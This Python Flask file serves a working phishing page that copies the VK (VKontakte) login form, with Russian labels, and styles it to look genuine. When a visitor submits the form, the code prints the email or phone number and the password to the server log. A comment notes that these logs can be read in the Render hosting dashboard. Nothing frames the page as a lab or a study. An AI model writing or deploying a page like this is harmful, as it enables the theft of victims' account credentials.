from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        login_data = request.form['email']
        password_data = request.form['pass']
        print(f"лог: {login_data}")
        print(f"пароль: {password_data}")
        return "Успешный вход! Данные залогированы на сервере."  # Логи可见ны в Render dashboard
    return render_template_string(LOGIN_TEMPLATE)

LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html class="vk vk_js_yes vk_flex_yes">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VK</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; background: #f7f9fb; }
        .layout { display: flex; flex-direction: column; min-height: 100vh; }
        .basis__content { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .pcont { max-width: 360px; width: 100%; }
        .form_item { background: white; border-radius: 12px; padding: 32px 24px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); }
        .login_header { text-align: center; font-size: 20px; color: #2c3657; margin-bottom: 24px; }
        .fi_row { margin-bottom: 16px; }
        .textfield { width: 100%; padding: 14px 16px; border: 1px solid #e6e8f0; border-radius: 8px; font-size: 16px; box-sizing: border-box; }
        .textfield:focus { outline: none; border-color: #5181b8; }
        .button { background: #5181b8; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; width: 100%; }
        .button:hover { background: #456fa0; }
        .near_btn { text-align: center; margin-top: 16px; }
        .login_restore a { color: #5181b8; text-decoration: none; font-size: 14px; }
        .login_new_user { margin: 24px 0; text-align: center; color: #818c98; font-size: 14px; }
        .success { background: #4bb34b !important; }
        .success:hover { background: #3d9b3d !important; }
    </style>
</head>
<body>
    <div class="layout">
        <div class="basis__content">
            <div class="pcont">
                <div class="PageBlock">
                    <div class="form_item">
                        <div class="login_header">Войдите на сайт</div>
                        <form method="POST">
                            <dl class="fi_row">
                                <dd><input type="text" class="textfield" name="email" placeholder="Телефон или почта" required></dd>
                            </dl>
                            <dl class="fi_row">
                                <dd><input type="password" class="textfield" name="pass" placeholder="Пароль" required></dd>
                            </dl>
                            <div class="fi_row_new">
                                <input class="button wide_button" type="submit" value="Войти">
                            </div>
                            <div class="fi_row">
                                <div class="near_btn wide_button login_restore"><a href="#">Забыли пароль?</a></div>
                            </div>
                            <div class="login_new_user">
                                <div>Первый раз на ВК?</div>
                            </div>
                            <div class="fi_row">
                                <a class="button wide_button success" href="#">Зарегистрироваться</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(debug=True)
